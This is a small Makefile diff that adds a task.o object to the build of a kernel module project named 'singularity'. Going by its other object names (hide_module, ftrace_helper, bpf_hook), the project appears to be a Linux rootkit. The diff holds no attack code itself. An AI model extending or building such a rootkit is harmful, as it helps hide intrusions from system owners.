@@ -16,6 +16,7 @@ singularity-objs := main.o \
     modules/bpf_hook.o \
     modules/icmp.o \
     modules/audit.o \
+    modules/task.o \
     modules/hide_module.o modules/trace.o ftrace/ftrace_helper.o
 
 all:
